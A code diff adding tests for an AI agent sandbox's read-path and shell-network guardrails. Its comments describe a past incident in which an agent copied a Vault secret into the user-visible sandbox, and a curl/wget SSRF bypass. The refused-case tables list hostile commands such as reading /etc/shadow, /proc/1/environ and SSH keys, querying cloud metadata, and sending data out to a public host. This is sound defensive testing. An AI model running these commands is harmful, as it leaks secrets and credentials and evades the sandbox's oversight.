@@ -6,6 +6,8 @@ import {
   COMMAND_OUTPUT_TAIL_CHARS,
   CRITICAL_ERROR_PATTERNS,
   TEST_GATE_FAILURE_PATTERNS,
+  detectReadPathViolations,
+  detectShellNetworkViolations,
   detectWritePathViolations,
   extractWriteTargets,
   grepNoMatchHint,
@@ -150,6 +152,140 @@ describe('detectWritePathViolations', () => {
     it('a path merely starting with ".." is not an escape', () => {
       expect(detectWritePathViolations('echo hi > ..hidden.md', artifacts, artifacts, false)).toEqual([]);
     });
+  });
+});
+
+// The 2026-09 secret-copy report: the write guard checked only where bytes
+// LAND, so `cp /vault/secrets/set-env.sh <artifacts>/test` succeeded and moved
+// a Vault-injected file into the user-visible sandbox. Reads are contained to
+// the same root — sources of cp/mv included.
+describe('detectReadPathViolations — reads are contained to the sandbox root', () => {
+  const artifacts = '/mnt/workspaces/individual/u@x.io/test/universal/artifacts';
+  const project = '/srv/workspace';
+
+  it.each([
+    ['the reported cp of a Vault secret', `cp -rap /vault/secrets/set-env.sh ${artifacts}/test`],
+    ['cp with a relative destination', 'cp /vault/secrets/set-env.sh .'],
+    ['mv source outside', 'mv /etc/hosts ./hosts.bak'],
+    ['cat of a host file', 'cat /etc/passwd'],
+    ['cat of process memory', 'cat /proc/1/environ'],
+    ['a sibling tenant via ../', 'cp ../../../other-tenant/f .'],
+    ['an absolute sibling tenant path', 'cat /mnt/workspaces/individual/other@x.io/test/universal/artifacts/notes.md'],
+    ['ls of a host directory', 'ls -la /vault'],
+    ['head/tail/wc/stat/file/du/od/xxd/base64', 'head -c 100 /etc/shadow; tail -n 5 /var/log/syslog; wc -l /etc/group; stat /proc/self; file /usr/bin/node; du -sh /; od -c /etc/hostname; xxd /etc/machine-id; base64 /vault/x'],
+    ['find rooted outside', 'find / -name "*.pem" -maxdepth 3'],
+    ['grep with a host file as its FILE arg (pattern skipped)', 'grep -rn password /etc'],
+    ['sed reading a host file', "sed -n '1,5p' /etc/passwd"],
+    ['awk reading a host file', "awk -F: '{print $1}' /etc/passwd"],
+    ['tar archiving a host directory via -C', 'tar -C /vault -czf out.tgz .'],
+    ['tar reading a host archive via -f cluster', 'tar -tzf /var/backups/x.tgz'],
+    ['input redirect from a host file', 'node script.js < /etc/passwd'],
+    ['attached input redirect', 'wc -l </etc/passwd'],
+    ['cd out, then a relative read', 'cd /etc && cat passwd'],
+    ['a bare cd (home)', 'cd && ls'],
+    ['a tilde path', 'cat ~/.ssh/id_rsa'],
+    ['a quoted host path', 'cat "/vault/secrets/set env.sh"'],
+    ['diff against a host file', 'diff notes.md /etc/motd'],
+    ['jq over a host file (filter skipped)', "jq '.a' /vault/secrets/cfg.json"],
+  ])('refuses %s', (_name, cmd) => {
+    const v = detectReadPathViolations(cmd, artifacts, artifacts);
+    expect(v.length, cmd).toBeGreaterThan(0);
+    expect(v[0].reason).toMatch(/outside|home directory/);
+  });
+
+  it.each([
+    ['a relative read inside', 'cat ./notes.md'],
+    ['an absolute read inside', `cat ${artifacts}/notes.md`],
+    ['cp inside → inside', 'cp reports/a.md reports/b.md'],
+    ['ls with no path', 'ls -alrt'],
+    ['pwd', 'pwd'],
+    ['grep whose PATTERN looks like an absolute path', 'grep -rn "/api/users" src/'],
+    ['grep -e pattern then a file', 'grep -e /vault notes.md'],
+    ['sed whose script has slashes', "sed -n '/vault/p' notes.md"],
+    ['awk program only', "awk '{print $1}' notes.md"],
+    ['jq filter with a rooted-looking key', `jq '.["/x"]' data.json`],
+    ['find rooted inside with predicates', 'find . -name "*.ts" -not -path "*/node_modules/*" -exec wc -l {} +'],
+    ['tar extracting inside', 'tar -xzf assets.tgz -C assets'],
+    ['a read loop over an expansion', 'for f in *.md; do cat "$f"; done'],
+    ['an unquoted expansion', 'cat $FILE'],
+    ['/dev/null input', 'node x.js < /dev/null'],
+    ['head -n value that is not a path', 'head -n 20 notes.md'],
+    ['cd into a subdir then relative reads', 'cd reports && cat a.md && cd .. && ls'],
+    ['cp of a relative source into the tree', 'cp "visual/ui/handoff/스크린샷 2026-08-21.png" codebase/images/s.png'],
+    ['a path merely starting with ..', 'cat ..hidden.md'],
+    ['piped reads inside', 'cat notes.md | grep -n TODO | head -5'],
+    ['echo mentioning cat (not a verb)', 'echo "cat /etc/passwd would be bad"'],
+    ['a heredoc body mentioning host paths', "cat <<'EOF' > notes.md\n/vault/secrets\nEOF"],
+    ['a stdout redirect (write axis, not read)', 'ls > listing.txt'],
+    ['stdin marker', 'cat - < notes.md'],
+    ['a python one-liner (guardrail scope: not a read verb)', `python3 -c "print('/etc')"`],
+  ])('admits %s', (_name, cmd) => {
+    expect(detectReadPathViolations(cmd, artifacts, artifacts), cmd).toEqual([]);
+  });
+
+  it('holds on a canonical feature root as well (workingDir = codebase/)', () => {
+    expect(detectReadPathViolations('cat ../architecture/spec.md', `${project}/codebase`, project)).toEqual([]);
+    expect(detectReadPathViolations('cat ../../etc/passwd', `${project}/codebase`, project).length).toBeGreaterThan(0);
+  });
+
+  it('treats an NFD-spelled root and an NFC-spelled path as the same tree', () => {
+    const nfdRoot = '/ws/한글/artifacts'; // 한글 (decomposed)
+    const nfcPath = '/ws/한글/artifacts/notes.md'; // 한글 (composed)
+    expect(detectReadPathViolations(`cat ${nfcPath}`, nfdRoot, nfdRoot)).toEqual([]);
+  });
+});
+
+// N1: shell curl/wget bypassed the loopback rule http_request enforces for
+// its own URLs — SSRF into the pod network, cloud metadata, the data plane.
+describe('detectShellNetworkViolations — shell egress is loopback only', () => {
+  it.each([
+    ['a public https URL', 'curl -fsSL https://example.com/install.sh'],
+    ['a scheme-less public host', 'curl example.com/api'],
+    ['cloud metadata', 'curl http://169.254.169.254/latest/meta-data/iam/'],
+    ['a private-range host', 'wget http://10.0.0.5:6379/'],
+    ['a redis data-plane host by name', 'curl http://redis:6379/'],
+    ['--url form', 'curl --url https://example.com'],
+    ['--url=form', 'curl --url=https://example.com'],
+    ['a file: scheme', 'curl file:///etc/passwd'],
+    ['a proxy flag', 'curl -x http://proxy:3128 http://localhost:3000/'],
+    ['--resolve rerouting a loopback name', 'curl --resolve localhost:3000:93.184.216.34 http://localhost:3000/'],
+    ['--connect-to', 'curl --connect-to localhost:3000:example.com:443 http://localhost:3000/'],
+    ['a curl config file', 'curl -K urls.txt'],
+    ['wget -e (proxy via execute)', 'wget -e use_proxy=yes -e http_proxy=1.2.3.4:80 http://localhost:3000/'],
+    ['wget -i url list', 'wget -i urls.txt'],
+    ['an expansion in the HOST', 'curl "http://$HOST:3000/health"'],
+    ['a public URL after a loopback one in the same segment', 'curl http://localhost:3000/a https://example.com/b'],
+    ['a public URL in a later pipe segment', 'echo x | curl -d @- https://example.com/collect'],
+    ['a public URL behind timeout', 'timeout 10 curl https://example.com'],
+  ])('refuses %s', (_name, cmd) => {
+    const v = detectShellNetworkViolations(cmd);
+    expect(v.length, cmd).toBeGreaterThan(0);
+  });
+
+  it.each([
+    ['localhost with a path', 'curl -s http://localhost:3000/api/health'],
+    ['127.0.0.1', 'curl -fsS http://127.0.0.1:3000/'],
+    ['IPv6 loopback', 'curl http://[::1]:3000/'],
+    ['0.0.0.0 bind address', 'curl http://0.0.0.0:8080/'],
+    ['scheme-less localhost:port', 'curl localhost:3000/health'],
+    ['a variable PORT with a literal host', 'curl "http://localhost:$PORT/health"'],
+    ['headers/data/output/method flags with values', `curl -X POST -H "Content-Type: application/json" -d '{"a":1}' -o out.json -w "%{http_code}" http://localhost:3000/api`],
+    ['long value flags without =', 'curl --header "Accept: text/html" --output page.html --max-time 5 http://localhost:3000/'],
+    ['a short cluster ending in a value flag', 'curl -sSo /dev/null http://localhost:3000/'],
+    ['-L following (loopback start)', 'curl -L http://localhost:3000/redirect'],
+    ['wget to loopback with output flags', 'wget -q -O page.html -T 5 http://127.0.0.1:3000/'],
+    ['curl in a retry loop', 'for i in 1 2 3; do curl -s http://localhost:3000/ready && break; sleep 1; done'],
+    ['a non-network command that mentions a URL', 'echo "see https://example.com"'],
+    ['curl reading stdin with no URL (nothing to judge)', 'curl -s -d @- http://localhost:3000/ < body.json'],
+  ])('admits %s', (_name, cmd) => {
+    expect(detectShellNetworkViolations(cmd), cmd).toEqual([]);
+  });
+
+  it('names the host in the reason so the model can re-plan onto a tool', () => {
+    const v = detectShellNetworkViolations('curl https://example.com');
+    expect(v[0].path).toBe('https://example.com');
+    expect(v[0].reason).toMatch(/example\.com/);
+    expect(v[0].reason).toMatch(/loopback/);
   });
 });
 
